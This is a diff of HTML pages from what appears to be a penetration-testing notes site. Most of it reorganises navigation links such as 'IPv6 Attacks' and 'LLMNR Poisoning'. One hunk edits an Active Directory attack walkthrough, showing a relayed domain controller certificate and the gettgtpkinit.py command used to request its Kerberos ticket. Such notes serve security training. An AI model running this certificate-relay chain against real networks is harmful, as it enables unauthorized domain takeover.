@@ -843,7 +843,7 @@
   
   
   <span class="md-ellipsis">
-    Index
+    Under Construction
     
   </span>
   
@@ -2684,6 +2684,29 @@
   
   
     <li class="md-nav__item">
+      <a href="../IPv6%20Attacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    IPv6 Attacks
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
       <a href="../LLMNR%20Poisoning/" class="md-nav__link">
         
   
@@ -3043,29 +3066,6 @@
   
   <span class="md-ellipsis">
     Group Policy Abuse
-    
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../Lateral%20Movement/IPv6%20Attacks/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    IPv6 Attacks
     
   </span>
   
@@ -3818,7 +3818,8 @@ OR coerce with nxc
 </span></code></pre></div></p>
 <p>You should receive a base64 encoded certificate in ntlmrelayx output
 Next, we can take this base64 certificate and use <code>gettgtpkinit.py</code> to request a Ticket-Granting-Ticket (TGT) for the domain controller.
-<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">python3</span> <span class="p">/</span><span class="n">opt</span><span class="p">/</span><span class="n">PKINITtools</span><span class="p">/</span><span class="n">gettgtpkinit</span><span class="p">.</span><span class="n">py</span> <span class="n">DOMAIN</span><span class="p">.</span><span class="n">LOCAL</span><span class="p">/</span><span class="n">DC01</span><span class="p">\$</span> <span class="n">-pfx-base64</span> <span class="n">MIIStQIBAzCCEn8GCSqGSI</span><span class="p">...</span><span class="n">SNIP</span><span class="p">...</span><span class="n">CKBdGmY</span><span class="p">=</span> <span class="n">dc01</span><span class="p">.</span><span class="n">ccache</span>
+<a href="https://github.com/dirkjanm/PKINITtools.git">https://github.com/dirkjanm/PKINITtools.git</a>
+<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">python3</span> <span class="n">gettgtpkinit</span><span class="p">.</span><span class="n">py</span> <span class="n">DOMAIN</span><span class="p">.</span><span class="n">LOCAL</span><span class="p">/</span><span class="n">DC01</span><span class="p">\$</span> <span class="n">-pfx-base64</span> <span class="n">MIIStQIBAzCCEn8GCSqGSI</span><span class="p">...</span><span class="n">SNIP</span><span class="p">...</span><span class="n">CKBdGmY</span><span class="p">=</span> <span class="n">dc01</span><span class="p">.</span><span class="n">ccache</span>
 </span></code></pre></div>
 Set krb env variable
 <div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="n">export</span> <span class="n">KRB5CCNAME</span><span class="p">=</span><span class="n">dc01</span><span class="p">.</span><span class="n">ccache</span>
